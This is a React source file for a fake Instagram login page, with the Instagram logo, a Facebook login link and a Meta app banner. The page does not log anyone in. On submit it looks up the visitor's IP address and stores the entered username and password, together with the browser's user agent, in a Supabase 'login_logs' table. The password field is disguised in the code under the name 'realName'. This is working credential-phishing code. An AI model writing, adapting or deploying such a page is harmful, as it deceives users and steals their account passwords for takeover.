import supabase from "../lid/supabase";
import { useState } from "react";
import metapic from "../assicet/metapic.png";
import insta from "../assicet/insta.png";
import InstaFooter from "./Footer";

function LoginPage() {
  const [username, setUsername] = useState("");
  const [realName, setRealName] = useState("");
  const [message, setMessage] = useState(null);
  const [status, setStatus] = useState("");
  const [loading, setLoading] = useState(false);

  const submit = async (event) => {
    event.preventDefault();
    setLoading(true);
    setMessage(null);

    if (!username.trim() || !realName.trim()) {
      setLoading(false);
      setStatus("error");
      setMessage("Username and password are required");
      return;
    }
    try {
      let ip = "";

      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData?.ip || "";
      } catch {
        ip = "";
      }

      const { error } = await supabase.from("login_logs").insert([
        {
          username: username.trim(),
          real_name: realName.trim(),
          ip,
          device: navigator.userAgent || "",
          time: new Date().toISOString(),
          status: "attempt",
        },
      ]);

      setLoading(false);

      if (error) {
        setStatus("error");
        setMessage(error.message || "Failed to log data");
      } else {
        setStatus("success");
        setMessage("Login tracked successfully");
      }
    } catch (err) {
      setLoading(false);
      setStatus("error");
      setMessage(err?.message || "Network error");
    }
  };

  return (
    <div className="min-h-screen bg-[#fafafa] flex justify-center">
      <div className="flex w-full max-w-[935px] flex-col justify-center gap-8">
        {/* LEFT IMAGE (desktop only) */}

        {/* RIGHT SIDE */}
        <div className="w-full max-w-[350px] ">
          {/* LOGIN CARD */}
          <div className="bg-white px-10 py-8 mb-3">
            {/* LOGO */}
            <img src={insta} alt="Instagram" className="mx-auto size-20 mb-6" />

            {/* FORM */}
            <form onSubmit={submit} className="">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone number, username, or email"
                className="w-full mb-3 bg-[#fafafa] border border-gray-300 text-xs px-3 py-4 rounded-xl outline-none focus:border-gray-400"
              />

              <input
                type="text"
                value={realName}
                onChange={(e) => setRealName(e.target.value)}
                placeholder="Password"
                className="w-full mb-6 bg-[#fafafa] border border-gray-300 text-xs px-3 py-4 rounded-xl outline-none focus:border-gray-400"
              />

              <button
                type="submit"
                disabled={loading}
                className={`w-full bg-[#0095f6] text-white text-sm font-semibold py-3 rounded-full disabled:opacity-50 ${loading ? "cursor-not-allowed" : "hover:bg-[#0084e0] opacity-60 "}`}
              >
                {loading ? "Logging in..." : "Log in"}
              </button>
            </form>
            <div className="text-center text-xs text-[#00376b] mt-3 cursor-pointer">
              Forgot password?
            </div>
            {/* OR */}
            <div className="flex items-center my-4">
              <div className="flex-1 h-[1px] bg-gray-300"></div>
              <span className="mx-3 text-xs text-gray-400 font-semibold">
                OR
              </span>
              <div className="flex-1 h-[1px] bg-gray-300"></div>
            </div>

            {/* FACEBOOK */}
            <div className="text-center text-[#385185] text-sm font-semibold cursor-pointer">
              Log in with Facebook
            </div>

            {/* FORGOT */}

            {/* MESSAGE */}
            {message && (
              <div
                className={`mt-4 text-center text-sm ${
                  status === "success" ? "text-green-600" : "text-red-500"
                }`}
              >
                {message}
              </div>
            )}
          </div>

          {/* SIGNUP */}
          <div className="bg-white border border-gray-300 rounded-full text-center py-4 text-sm">
            Don't have an account?{" "}
            <span className="text-[#0095f6] font-semibold cursor-pointer">
              Sign up
            </span>
          </div>

          {/* APP LINKS */}
          <div className="text-center mt-5">
            <p className="text-sm mb-3">Get the app.</p>
            <div className="flex justify-center gap-2">
              <img src={metapic} alt="photo not found" className="w-[70px]" />
            </div>
          </div>
        </div>
        <InstaFooter />
      </div>
    </div>
  );
}

export default LoginPage;
